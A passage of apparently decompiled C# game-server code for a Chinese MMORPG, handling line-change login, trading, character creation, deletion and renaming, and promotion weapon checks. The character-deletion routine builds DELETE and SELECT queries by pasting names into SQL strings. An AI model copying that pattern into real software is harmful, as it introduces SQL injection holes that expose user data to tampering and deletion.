						关闭商店(73);
						if (int.Parse(x) == 520)
						{
							base.仙魔大战派别 = "仙族";
							系统提示("您属于「仙族」, 敌对势力为「白披风」, 如自身披风外观异常, 请打开披风效果。", 3, "魔族");
						}
						else if (int.Parse(x) == -520)
						{
							base.仙魔大战派别 = "魔族";
							系统提示("您属于「魔族」, 敌对势力为「黑披风」, 如自身披风外观异常, 请打开披风效果。", 3, "魔族");
						}
						break;
					default:
						关闭商店(73);
						break;
					}
					if (World.ServerID == 28)
					{
						系统提示("你当前所在的线路是：银币互通线", 10, "线路提示");
					}
					else if (base.人物坐标_地图 == 41001)
					{
						系统提示("欢迎进入跨线[仙魔大战]！获胜方能获得丰厚奖励！", 10, "势力提示");
					}
					else
					{
						系统提示("你当前所在的线路是：" + World.ServerID + "线", 10, "线路提示");
					}
					num = 25;
					加载攻城数据();
					if (World.天魔神宫占领者.Length > 0)
					{
						系统提示("天魔神宫已经被门派《" + World.天魔神宫占领者 + "》占领!", 10, "系统提示");
					}
					if (base.宣告攻城 == 1)
					{
						发送攻城相关BUFF(是否消失: false);
					}
					num = 27;
					检测神器斗战增加状态();
					num = 29;
					检测装备强化数();
					num = 30;
					重置地图();
					num = 28;
					Thread.Sleep(20);
					Connect conn = World.conn;
					string[] array = new string[12]
					{
						"换线登陆|",
						base.Userid,
						"|",
						base.Client.ToString(),
						"|",
						World.ServerID.ToString(),
						"|",
						null,
						null,
						null,
						null,
						null
					};
					array[7] = base.人物全服ID.ToString();
					array[8] = "|";
					array[9] = base.Client.绑定帐号;
					array[10] = "|0|";
					array[11] = 客户端设置;
					string msg = string.Concat(array);
					conn.发送(msg);
					本人退出组队提示();
					Thread.Sleep(20);
					关闭交易窗口();
					上线 = true;
					判断是否用封包登陆 = 1;
					SerList.Clear();
					Connect conn2 = World.conn;
					string msg2 = "获取服务器列表|" + base.Userid + "|" + base.原服务器序号 + "|" + base.原服务器IP + "|" + base.原服务器端口 + "|" + base.原服务器ID;
					conn2.发送(msg2);
				}
				else if (base.Client != null)
				{
					base.Client.Dispose();
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(100, "人物登陆出错[" + base.Userid + "]-[" + base.UserName + "] " + num + " " + ex.Message);
				if (base.Client != null)
				{
					kickidlog("换线人物登陆出错 " + num);
					OpClient(1);
					base.Client.Dispose();
				}
			}
		}

		public void 关闭交易窗口()
		{
			byte[] array = Converter.hexStringToByte("AA55420000009800340006000000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 隔体传功(byte[] data, int length)
		{
			封包修改(data, length);
			byte[] array = new byte[4];
			Buffer.BlockCopy(data, 18, array, 0, 4);
			int 人物的ID = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[4];
			Buffer.BlockCopy(data, 10, array2, 0, 4);
			int num = BitConverter.ToInt32(array2, 0);
			switch (num)
			{
			case 1:
			{
				int num2 = data[46];
				if (装备栏包裹[num2].Get物品ID != 1008000130)
				{
					break;
				}
				byte[] array3 = new byte[13];
				for (int i = 0; i < length && data[i + 22] != 0; i++)
				{
					array3[i] = data[i + 22];
				}
				string username = Encoding.Default.GetString(array3).Trim().Replace("\0", "");
				Players players = World.检查玩家name(username);
				if (players == null)
				{
					break;
				}
				byte[] array4 = new byte[32];
				Buffer.BlockCopy(data, 50, array4, 0, 32);
				string @string = Encoding.Default.GetString(array4);
				string sqlCommand = "select FLD_ID, FLD_CARD from [TBL_ACCOUNT] where FLD_ID=@Userid";
				SqlParameter[] prams = new SqlParameter[1] { SqlDBA.MakeInParam("@Userid", SqlDbType.VarChar, 30, base.Userid) };
				DataTable dBToDataTable = DBA.GetDBToDataTable(sqlCommand, prams, "rxjhaccount");
				if (dBToDataTable == null)
				{
					break;
				}
				if (dBToDataTable.Rows.Count == 0)
				{
					dBToDataTable.Dispose();
					break;
				}
				string value = RxjhClass.md5(dBToDataTable.Rows[0]["FLD_CARD"].ToString());
				dBToDataTable.Dispose();
				if (@string.Equals(value))
				{
					发送交易请求(5663, 人物的ID, num);
				}
				else
				{
					系统提示("安全码错误。", 6, "系統提示");
				}
				break;
			}
			case 2:
				if (!打开仓库中)
				{
					接受交易请求(5663, num);
				}
				break;
			case 3:
				对方取消交易请求(5663, 人物的ID, num);
				break;
			case 4:
				本人取消交易请求(5663, 人物的ID, num);
				break;
			case 5:
				同意接受(5663, 人物的ID, num);
				break;
			case 6:
				同意接受(5663, 人物的ID, num);
				break;
			case 7:
				关闭交易(5663, 人物的ID, num);
				break;
			}
		}

		public void 版本验证(byte[] data, int length)
		{
			连接成功 = true;
			try
			{
				base.Client.g_cur_key2 = World.g_cur_key2;
				byte[] array = Converter.hexStringToByte("AA551A00100515200400700700000000000000000000000000000000000055AA");
				if (World.登录器版本切换 == 1)
				{
					Buffer.BlockCopy(World.g_cur_key, 0, array, 14, 8);
				}
				else
				{
					Buffer.BlockCopy(World.g_cur_key2, 0, array, 14, 8);
				}
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				base.Client.版本验证 = true;
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "连接登陆版本验证出错[" + base.人物全服ID + "]-[" + base.Client.ToString() + "]" + ex.Message);
			}
		}

		public void 换线验证(byte[] data, int length)
		{
			int num = 0;
			连接成功 = true;
			try
			{
				num = 1;
				byte[] array = Converter.hexStringToByte("AA559200100515208400700700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
				num = 2;
				Random random = new Random();
				num = 3;
				byte[] array2 = new byte[8];
				num = 4;
				for (int i = 0; i < array2.Length; i++)
				{
					array2[i] = (byte)random.Next(1, 255);
				}
				num = 7;
				base.人物封包ID = BitConverter.ToUInt16(data, 4);
				num = 8;
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				num = 9;
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				num = 10;
				byte[] array3 = new byte[20];
				num = 11;
				for (int j = 0; j < 20 && data[10 + j] != 0; j++)
				{
					array3[j] = data[10 + j];
				}
				num = 12;
				string text = Encoding.Default.GetString(array3).Trim();
				num = 13;
				string empty = string.Empty;
				string text2 = text.Replace("\0", empty).Trim();
				num = 14;
				int num2 = data[30];
				int num3 = data[34];
				num = 15;
				World.conn.发送("用户换线登陆|" + text2 + "|" + num2 + "|" + num3 + "|" + base.Client.WorldId + "|" + base.Client.ToString() + "|" + World.ServerID + "|" + 判断是否用封包登陆);
				byte[] array4 = Converter.hexStringToByte("AA550700AE04DB0001000155AA");
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array4, array4.Length);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, num + " 换线验证[" + base.人物全服ID + "]-[" + base.Client.ToString() + "]" + ex.Message);
			}
		}

		public void 删除人物(byte[] data, int length)
		{
			try
			{
				int num = data[18];
				if (!allChars.TryGetValue(num, out var value))
				{
					if (base.Client != null)
					{
						kickidlog("删除人物1");
						base.Client.Dispose();
					}
					return;
				}
				byte[] array = new byte[32];
				Buffer.BlockCopy(data, 22, array, 0, array.Length);
				string text = Encoding.Default.GetString(array).Trim();
				string sqlCommand = "select FLD_ID, FLD_CARD from [TBL_ACCOUNT] where FLD_ID=@Userid";
				SqlParameter[] prams = new SqlParameter[1] { SqlDBA.MakeInParam("@Userid", SqlDbType.VarChar, 30, base.Userid) };
				DataTable dBToDataTable = DBA.GetDBToDataTable(sqlCommand, prams, "rxjhaccount");
				if (dBToDataTable == null && base.Client != null)
				{
					kickidlog("删除人物2");
					不能删除人物之掌门();
					return;
				}
				DataTable dBToDataTable2 = DBA.GetDBToDataTable("select * from TBL_XWWL_GuildMember WHERE FLD_NAME ='" + value + "'");
				if (dBToDataTable2.Rows.Count > 0 && dBToDataTable2.Rows[0]["leve"].ToString() == "6")
				{
					不能删除人物之掌门();
					return;
				}
				string value2 = RxjhClass.md5(dBToDataTable.Rows[0]["FLD_CARD"].ToString());
				if (text.Equals(value2))
				{
					kickidlog("删除角色成功[" + value + "]");
					删除人物(value);
					人物删除成功(num);
				}
				else
				{
					身份证号码错误();
				}
				dBToDataTable.Dispose();
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "删除人物出错[" + base.Userid + "]-[" + base.Client.ToString() + "]" + ex.Message);
			}
		}

		public void 身份证号码错误()
		{
			string hex = "AA550E007B041F000800630000000900000055AA";
			byte[] array = Converter.hexStringToByte(hex);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 人物删除成功(int 参数删除成功的人物位置)
		{
			string hex = "AA550E002C011F000800010000000100000055AA";
			byte[] array = Converter.hexStringToByte(hex);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(参数删除成功的人物位置), 0, array, 14, 1);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 不能删除人物之掌门()
		{
			string hex = "AA550E002D011F000800650000000900000055AA";
			byte[] array = Converter.hexStringToByte(hex);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public bool 删除人物(string UserName)
		{
			try
			{
				if (DBA.ExeSqlCommand("DELETE TBL_XWWL_Char WHERE FLD_NAME='" + UserName + "'") == -1 || DBA.ExeSqlCommand("DELETE TBL_XWWL_Cw WHERE ZrName='" + UserName + "'") == -1 || DBA.ExeSqlCommand("DELETE TBL_XWWL_GuildMember WHERE FLD_NAME='" + UserName + "'") == -1 || DBA.ExeSqlCommand("DELETE TBL_XWWL_Warehouse WHERE FLD_NAME='" + UserName + "'") == -1 || DBA.ExeSqlCommand("DELETE TBL_XWWL_RoseTop WHERE FLD_NAME='" + UserName + "'") == -1 || DBA.ExeSqlCommand("DELETE TBL_XWWL_GuildMember WHERE FLD_NAME='" + UserName + "'") == -1)
				{
					return false;
				}
				if (DBA.ExeSqlCommand("DELETE TBL_荣誉系统 WHERE FLD_人物名='" + UserName + "'") == -1 || DBA.ExeSqlCommand("DELETE 荣誉门派排行 WHERE FLD_NAME='" + UserName + "'") == -1 || DBA.ExeSqlCommand("DELETE 荣誉讨伐排行 WHERE FLD_NAME='" + UserName + "'") == -1 || DBA.ExeSqlCommand("DELETE 荣誉武林排行 WHERE FLD_NAME='" + UserName + "'") == -1 || DBA.ExeSqlCommand("DELETE 荣誉势力排行 WHERE FLD_NAME='" + UserName + "'") == -1)
				{
					return false;
				}
			}
			catch
			{
				return false;
			}
			return true;
		}

		public void 创建人物(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				string hex = "AA55120000001500040000000000000000000000000055AA";
				string hex2 = "AA55120000001500040001000000000000000000000055AA";
				byte[] array = Converter.hexStringToByte(hex);
				byte[] array2 = Converter.hexStringToByte(hex2);
				byte[] array3 = new byte[14];
				Buffer.BlockCopy(封包数据, 10, array3, 0, 14);
				byte[] array4 = new byte[10];
				Buffer.BlockCopy(封包数据, 27, array4, 0, 10);
				string text = "0x" + Converter.ToString(array4);
				string text2 = Encoding.Default.GetString(array3).Replace("\0", string.Empty).Trim();
				int num = 封包数据[26];
				byte b = 封包数据[32];
				byte b2 = b;
				if ((uint)(b2 - 1) <= 1u)
				{
					if (num < 1 || num > 13)
					{
						封号(720, base.Userid, "非法人物职业");
						return;
					}
					if (text2.Length == 0)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send(array, array.Length);
						}
					}
					if (RxjhClass.SetUserName(base.Userid, text2, num, array4) != 1)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send(array, array.Length);
						}
					}
					else
					{
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send(array2, array2.Length);
						}
					}
				}
				else
				{
					封号(720, base.Userid, "非法人物性别");
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "连创建人物出错[" + base.Userid + "]-[" + base.Client.ToString() + "]" + ex.Message);
			}
		}

		public void 打开换名符(byte[] data, int length)
		{
			封包修改(data, length);
			int num = BitConverter.ToInt32(data, 15);
			if (num != 1008000126)
			{
				return;
			}
			using 发包类 发包类 = new 发包类();
			发包类.Write4(0);
			发包类.Write8(num);
			发包类.Write4(0);
			发包类.Write4(0);
			发包类.Write4(0);
			发包类.Write4(0);
			发包类.Write4(1);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 29744, base.人物全服ID);
			}
		}

		public void 换人物名(byte[] data, int length)
		{
			封包修改(data, length);
			byte[] array = Converter.hexStringToByte("AA551E002C01910010002F000000000000000000000000000000000000000000000055AA");
			try
			{
				byte[] array2 = new byte[4];
				Buffer.BlockCopy(data, 26, array2, 0, 1);
				if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array2, 0)].物品ID, 0) != 1008000126)
				{
					return;
				}
				byte[] array3 = new byte[14];
				for (int i = 0; i < 15 && data[10 + i] != 0; i++)
				{
					array3[i] = data[10 + i];
				}
				string text = Encoding.Default.GetString(array3).Trim();
				text = text.Replace("\0", "").Trim();
				byte[] bytes = Encoding.Default.GetBytes(text);
				foreach (KillClass item in World.Kill)
				{
					if (item.Sffh == 4 && text.IndexOf(item.Txt) != -1)
					{
						MainForm.WriteLine(100, "非法创建名字：" + text + " 帐号" + base.Userid);
						系统提示("非法人物名, 请重新输入", 9, "系统提示");
						return;
					}
				}
				if (bytes.Length <= 4)
				{
					系统提示("名字过短请重置", 9, "系统信息");
				}
				if (bytes.Length > 14)
				{
					系统提示("名字过长请重置", 9, "系统信息");
				}
				if (base.帮派Id != 0)
				{
					系统提示("请先退出门派再换名。");
				}
				else if (组队id != 0)
				{
					系统提示("请先退出组队再换名。");
				}
				else if (base.FLD_情侣.Length != 0)
				{
					系统提示("请先解除情侣再换名。");
				}
				else if (师傅数据.TID != -1)
				{
					系统提示("请先解除师徒再换名。");
				}
				else if (徒弟数据[0].TID == -1 && 徒弟数据[1].TID == -1 && 徒弟数据[2].TID == -1)
				{
					DBA.ExeSqlCommand("UPDATE TBL_XWWL_Char SET FLD_NAME = @sTemp WHERE FLD_ID = @Userid AND FLD_NAME = @Username", new SqlParameter[3]
					{
						SqlDBA.MakeInParam("@Userid", SqlDbType.VarChar, 30, base.Userid),
						SqlDBA.MakeInParam("@Username", SqlDbType.VarChar, 30, base.UserName),
						SqlDBA.MakeInParam("@sTemp", SqlDbType.VarChar, 30, text)
					});
					DBA.ExeSqlCommand("UPDATE TBL_XWWL_Warehouse SET FLD_NAME = @sTemp WHERE FLD_ID = @Userid AND FLD_NAME = @Username", new SqlParameter[3]
					{
						SqlDBA.MakeInParam("@Userid", SqlDbType.VarChar, 30, base.Userid),
						SqlDBA.MakeInParam("@Username", SqlDbType.VarChar, 30, base.UserName),
						SqlDBA.MakeInParam("@sTemp", SqlDbType.VarChar, 30, text)
					});
					DBA.ExeSqlCommand("UPDATE TBL_XWWL_Cw SET ZrNAME = @sTemp WHERE ZrNAME = @Username", new SqlParameter[2]
					{
						SqlDBA.MakeInParam("@Username", SqlDbType.VarChar, 30, base.UserName),
						SqlDBA.MakeInParam("@sTemp", SqlDbType.VarChar, 30, text)
					});
					DBA.ExeSqlCommand("UPDATE 荣誉势力排行 SET FLD_NAME = @sTemp WHERE FLD_NAME = @Username", new SqlParameter[2]
					{
						SqlDBA.MakeInParam("@Username", SqlDbType.VarChar, 30, base.UserName),
						SqlDBA.MakeInParam("@sTemp", SqlDbType.VarChar, 30, text)
					});
					DBA.ExeSqlCommand("UPDATE 荣誉武林排行 SET FLD_NAME = @sTemp WHERE FLD_NAME = @Username", new SqlParameter[2]
					{
						SqlDBA.MakeInParam("@Username", SqlDbType.VarChar, 30, base.UserName),
						SqlDBA.MakeInParam("@sTemp", SqlDbType.VarChar, 30, text)
					});
					World.发送公告("玩家[" + base.UserName + "]使用换名符将名字更换为[" + text + "], 这货肯定是为了躲避仇家追杀!");
					base.UserName = text;
					减去物品(BitConverter.ToInt32(array2, 0), 1);
					初始化已装备物品();
					移动离开当前地图(base.人物坐标_地图);
					获取复查范围玩家();
					系统提示("换名成功, 请重新上线。");
					更新人物数据(this);
					更新广播人物数据();
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
					退回到人物列表(null, 0);
				}
				else
				{
					系统提示("请先解除师徒再换名。");
				}
			}
			catch (Exception)
			{
				系统提示("系统出错请联系客服人员。");
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
		}

		public bool 检测转职武器()
		{
			if (World.英雄职业转职需要武器 == 1)
			{
				int num = 得到包裹空位数();
				if (base.Player_Job == 8)
				{
					if (num < 2)
					{
						系统提示("背包没有空位了， 赶快清理下再来转职吧。", 9, "[系统提示]");
						return false;
					}
					if (装备栏已穿装备[3].Get物品ID == 0)
					{
						系统提示("请带上火龙刀武器进行专职。", 9, "[系统提示]");
						return false;
					}
					if (!装备栏已穿装备[3].Get物品ID.ToString().Contains("1002040"))
					{
						系统提示("请带上火龙刀武器进行专职。", 9, "[系统提示]");
						return false;
					}
					if (base.Player_Job_leve < 8)
					{
						if (装备栏已穿装备[3].Get物品ID != 100204001 + base.Player_Job_leve)
						{
							系统提示("请带上对应火龙刀[" + base.Player_Job_leve + "转]武器进行专职。", 9, "[系统提示]");
							return false;
						}
					}
					else if (base.Player_Job_leve == 8)
					{
						if (装备栏已穿装备[3].Get物品ID != 100204009 && 装备栏已穿装备[3].Get物品ID != 100204010)
						{
							系统提示("请带上对应火龙刀[升天3]武器进行专职。", 9, "[系统提示]");
							return false;
						}
					}
					else if (base.Player_Job_leve == 9 && 装备栏已穿装备[3].Get物品ID != 100204026 && 装备栏已穿装备[3].Get物品ID != 100204027)
					{
						系统提示("请带上对应火龙刀[升天4]武器进行专职。", 9, "[系统提示]");
						return false;
					}
				}
				else if (base.Player_Job == 9)
				{
					if (num < 2)
					{
						系统提示("背包没有空位了， 赶快清理下再来转职吧。", 9, "[系统提示]");
						return false;
					}
					if (装备栏已穿装备[3].Get物品ID == 0)
					{
						系统提示("请带上伏魔花灵剑[" + base.Player_Job_leve + "转]武器进行专职。", 9, "[系统提示]");
						return false;
					}
					if (!装备栏已穿装备[3].Get物品ID.ToString().Contains("2002040"))
					{
						系统提示("请带上伏魔花灵剑武器进行专职。", 9, "[系统提示]");
						return false;
					}
					if (base.Player_Job_leve < 8)
					{
						if (装备栏已穿装备[3].Get物品ID != 200204001 + base.Player_Job_leve)
						{
							系统提示("请带上对应伏魔花灵剑武器进行专职。", 9, "[系统提示]");
							return false;
						}
					}
					else if (base.Player_Job_leve == 8)
					{
						if (装备栏已穿装备[3].Get物品ID != 200204009 && 装备栏已穿装备[3].Get物品ID != 200204010)
						{
							系统提示("请带上对应伏魔花灵剑[升天3]武器进行专职。", 9, "[系统提示]");
							return false;
						}
					}
					else if (base.Player_Job_leve == 9 && 装备栏已穿装备[3].Get物品ID != 200204026 && 装备栏已穿装备[3].Get物品ID != 200204027)
					{
						系统提示("请带上对应伏魔花灵[升天4]剑武器进行专职。", 9, "[系统提示]");
						return false;
					}
				}
				else if (base.Player_Job == 11)
				{
					if (num < 2)
					{
						系统提示("背包没有空位了， 赶快清理下再来转职吧。", 9, "[系统提示]");
						return false;
					}
					if (装备栏已穿装备[3].Get物品ID == 0)
					{
						系统提示("请带上玄武破天弓武器进行专职。", 9, "[系统提示]");
						return false;
					}
					if (!装备栏已穿装备[3].Get物品ID.ToString().Contains("4002040"))
					{
						系统提示("请带上玄武破天弓[" + base.Player_Job_leve + "转]武器进行专职。", 9, "[系统提示]");
						return false;
					}
					if (base.Player_Job_leve < 8)
					{
						if (装备栏已穿装备[3].Get物品ID != 400204001 + base.Player_Job_leve)
						{
							系统提示("请带上玄武破天弓武器进行专职。", 9, "[系统提示]");
							return false;
						}
					}
					else if (base.Player_Job_leve == 8)
					{
						if (装备栏已穿装备[3].Get物品ID != 400204009 && 装备栏已穿装备[3].Get物品ID != 400204010)
						{
							系统提示("请带上玄武破天弓[升天3]武器进行专职。", 9, "[系统提示]");
							return false;
						}
					}
					else if (base.Player_Job_leve == 9 && 装备栏已穿装备[3].Get物品ID != 400204026 && 装备栏已穿装备[3].Get物品ID != 400204027)
					{
						系统提示("请带上玄武破天弓[升天4]武器进行专职。", 9, "[系统提示]");
						return false;
					}
				}
				else if (base.Player_Job == 12)
				{
					if (num < 2)
					{
						系统提示("背包没有空位了， 赶快清理下再来转职吧。", 9, "[系统提示]");
						return false;
					}
					if (装备栏已穿装备[3].Get物品ID == 0)
					{
						系统提示("请带上追魂五星枪[" + base.Player_Job_leve + "转]武器进行专职。", 9, "[系统提示]");
						return false;
					}
					if (!装备栏已穿装备[3].Get物品ID.ToString().Contains("3002040"))
					{
						系统提示("请带上追魂五星枪武器进行专职。", 9, "[系统提示]");
						return false;
					}
					if (base.Player_Job_leve < 8)
					{
						if (装备栏已穿装备[3].Get物品ID != 300204001 + base.Player_Job_leve)
						{
							系统提示("请带上追魂五星枪武器进行专职。", 9, "[系统提示]");
							return false;
						}
					}
					else if (base.Player_Job_leve == 8)
					{
						if (装备栏已穿装备[3].Get物品ID != 300204009 && 装备栏已穿装备[3].Get物品ID != 300204010)
						{
							系统提示("请带上追魂五星枪[升天3]武器进行专职。", 9, "[系统提示]");
							return false;
						}
					}
					else if (base.Player_Job_leve == 9 && 装备栏已穿装备[3].Get物品ID != 300204026 && 装备栏已穿装备[3].Get物品ID != 300204027)
					{
						系统提示("请带上追魂五星枪[升天4]武器进行专职。", 9, "[系统提示]");
						return false;
					}
				}
				else if (base.Player_Job == 13)
				{
					if (num < 2)
					{
						系统提示("背包没有空位了， 赶快清理下再来转职吧。", 9, "[系统提示]");
						return false;
					}
					if (装备栏已穿装备[3].Get物品ID == 0)
					{
						系统提示("请带上寒玉神杖武器进行专职。", 9, "[系统提示]");
						return false;
					}
					if (!装备栏已穿装备[3].Get物品ID.ToString().Contains("5002040"))
					{
						系统提示("请带上寒玉神杖武器进行专职。", 9, "[系统提示]");
						return false;
					}
					if (base.Player_Job_leve < 8)
					{
						if (装备栏已穿装备[3].Get物品ID != 500204001 + base.Player_Job_leve)
						{
							系统提示("请带上寒玉神杖[" + base.Player_Job_leve + "转]武器进行专职。", 9, "[系统提示]");
							return false;
						}
					}
					else if (base.Player_Job_leve == 8)
					{
						if (装备栏已穿装备[3].Get物品ID != 500204009 && 装备栏已穿装备[3].Get物品ID != 500204010)
						{
							系统提示("请带上寒玉神杖[升天3]武器进行专职。", 9, "[系统提示]");
							return false;
						}
					}
					else if (base.Player_Job_leve == 9 && 装备栏已穿装备[3].Get物品ID != 500204026 && 装备栏已穿装备[3].Get物品ID != 500204027)
					{
						系统提示("请带上寒玉神杖[升天4]武器进行专职。", 9, "[系统提示]");
						return false;
					}
				}
			}
			return true;
		}

		public void 发送转职武器()
		{
			if (World.英雄职业转职需要武器 != 1 || (base.Player_Job != 8 && base.Player_Job != 9 && base.Player_Job != 11 && base.Player_Job != 12 && base.Player_Job != 13))
			{
				return;
			}
			long get物品ID = 装备栏已穿装备[3].Get物品ID;
			int num = 装备栏已穿装备[3].FLD_MAGIC0;
			int fLD_强化数量 = 装备栏已穿装备[3].FLD_强化数量;
			if (fLD_强化数量 > 0)
			{
				物品类 物品类2 = 得到包裹物品(1008001543);
				if (物品类2 == null)
				{
					num--;
				}
				else
				{
					减去物品(物品类2.物品位置, 1);
				}
			}
			装备栏已穿装备[3].FLD_MAGIC0 = num;
			byte[] bytes = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
			if (base.Player_Job == 8)
			{
				if (base.Player_Job_leve == 9)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(get物品ID + 17), 0, 装备栏已穿装备[3].物品_byte, 8, 4);
					Buffer.BlockCopy(bytes, 0, 装备栏已穿装备[3].物品_byte, 0, 8);
					计算人物装备数据();
					更新HP_MP_SP();
					更新金钱和负重();
					更新武功和状态();
					更新装备效果();
				}
				else if (base.Player_Job_leve == 10)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(get物品ID + 7), 0, 装备栏已穿装备[3].物品_byte, 8, 4);
					Buffer.BlockCopy(bytes, 0, 装备栏已穿装备[3].物品_byte, 0, 8);
					计算人物装备数据();
					更新HP_MP_SP();
					更新金钱和负重();
					更新武功和状态();
					更新装备效果();
				}
				else
				{
					Buffer.BlockCopy(BitConverter.GetBytes(get物品ID + 1), 0, 装备栏已穿装备[3].物品_byte, 8, 4);
					Buffer.BlockCopy(bytes, 0, 装备栏已穿装备[3].物品_byte, 0, 8);
					计算人物装备数据();
					更新HP_MP_SP();
					更新金钱和负重();
					更新武功和状态();
					更新装备效果();
				}
			}
			else if (base.Player_Job == 9)
			{
				if (base.Player_Job_leve == 9)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(get物品ID + 17), 0, 装备栏已穿装备[3].物品_byte, 8, 4);
					Buffer.BlockCopy(bytes, 0, 装备栏已穿装备[3].物品_byte, 0, 8);
					计算人物装备数据();
					更新HP_MP_SP();
					更新金钱和负重();
					更新武功和状态();
					更新装备效果();
				}
				else if (base.Player_Job_leve == 10)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(get物品ID + 7), 0, 装备栏已穿装备[3].物品_byte, 8, 4);
					Buffer.BlockCopy(bytes, 0, 装备栏已穿装备[3].物品_byte, 0, 8);
					计算人物装备数据();
					更新HP_MP_SP();
					更新金钱和负重();
					更新武功和状态();
					更新装备效果();
				}
				else
				{
					Buffer.BlockCopy(BitConverter.GetBytes(get物品ID + 1), 0, 装备栏已穿装备[3].物品_byte, 8, 4);
					Buffer.BlockCopy(bytes, 0, 装备栏已穿装备[3].物品_byte, 0, 8);
					计算人物装备数据();
					更新HP_MP_SP();
					更新金钱和负重();
					更新武功和状态();
					更新装备效果();
				}
			}
			else if (base.Player_Job == 11)
			{
				if (base.Player_Job_leve == 9)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(get物品ID + 17), 0, 装备栏已穿装备[3].物品_byte, 8, 4);
					Buffer.BlockCopy(bytes, 0, 装备栏已穿装备[3].物品_byte, 0, 8);
					计算人物装备数据();
					更新HP_MP_SP();
					更新金钱和负重();
					更新武功和状态();
					更新装备效果();
				}
				else if (base.Player_Job_leve == 10)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(get物品ID + 7), 0, 装备栏已穿装备[3].物品_byte, 8, 4);
					Buffer.BlockCopy(bytes, 0, 装备栏已穿装备[3].物品_byte, 0, 8);
					计算人物装备数据();
					更新HP_MP_SP();
					更新金钱和负重();
					更新武功和状态();
					更新装备效果();
				}
				else
				{
					Buffer.BlockCopy(BitConverter.GetBytes(get物品ID + 1), 0, 装备栏已穿装备[3].物品_byte, 8, 4);
					Buffer.BlockCopy(bytes, 0, 装备栏已穿装备[3].物品_byte, 0, 8);
					计算人物装备数据();
					更新HP_MP_SP();
					更新金钱和负重();
					更新武功和状态();
					更新装备效果();
				}
			}
			else if (base.Player_Job == 12)
			{
				if (base.Player_Job_leve == 9)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(get物品ID + 17), 0, 装备栏已穿装备[3].物品_byte, 8, 4);
					Buffer.BlockCopy(bytes, 0, 装备栏已穿装备[3].物品_byte, 0, 8);
					计算人物装备数据();
					更新HP_MP_SP();
					更新金钱和负重();
					更新武功和状态();
					更新装备效果();
				}
				else if (base.Player_Job_leve == 10)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(get物品ID + 7), 0, 装备栏已穿装备[3].物品_byte, 8, 4);
					Buffer.BlockCopy(bytes, 0, 装备栏已穿装备[3].物品_byte, 0, 8);
					计算人物装备数据();
					更新HP_MP_SP();
					更新金钱和负重();
					更新武功和状态();
					更新装备效果();
				}
				else
				{
					Buffer.BlockCopy(BitConverter.GetBytes(get物品ID + 1), 0, 装备栏已穿装备[3].物品_byte, 8, 4);
					Buffer.BlockCopy(bytes, 0, 装备栏已穿装备[3].物品_byte, 0, 8);
					计算人物装备数据();
					更新HP_MP_SP();
					更新金钱和负重();
					更新武功和状态();
					更新装备效果();
				}
			}
			else if (base.Player_Job == 13)
			{
				if (base.Player_Job_leve == 9)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(get物品ID + 17), 0, 装备栏已穿装备[3].物品_byte, 8, 4);
					Buffer.BlockCopy(bytes, 0, 装备栏已穿装备[3].物品_byte, 0, 8);
					计算人物装备数据();
					更新HP_MP_SP();
					更新金钱和负重();
					更新武功和状态();
					更新装备效果();
				}
				else if (base.Player_Job_leve == 10)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(get物品ID + 7), 0, 装备栏已穿装备[3].物品_byte, 8, 4);
					Buffer.BlockCopy(bytes, 0, 装备栏已穿装备[3].物品_byte, 0, 8);
					计算人物装备数据();
